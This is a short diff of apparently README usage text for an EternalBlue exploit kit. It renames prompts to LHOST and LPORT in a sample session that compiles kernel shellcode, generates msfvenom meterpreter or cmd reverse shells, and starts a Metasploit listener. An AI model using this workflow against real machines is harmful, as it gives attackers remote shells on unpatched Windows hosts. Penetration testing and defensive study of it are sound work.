@@ -33,11 +33,11 @@ Compiling x64 kernel shellcode
 Compiling x86 kernel shellcode
 kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
 y
-IP for reverse connection:
+LHOST for reverse connection:
 <YOUR-IP>
-PORT you want x64 to listen on:
+LPORT you want x64 to listen on:
 <SOME PORT>
-PORT you want x86 to listen on:
+LPORT you want x86 to listen on:
 <SOME OTHER PORT>
 Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
 0
@@ -58,11 +58,11 @@ Follow the propmts, for example:
    `--'
 Enternal Blue Metasploit Listener
 
-IP for reverse connection:
+LHOST for reverse connection:
 <YOUR-IP>
-PORT for x64 reverse connection:
+LPORT for x64 reverse connection:
 <SOME PORT>
-PORT for x86 reverse connection:
+LPORT for x86 reverse connection:
 <SOME OTHER PORT>
 Enter 0 for meterpreter shell or 1 for regular cmd shell:
 0
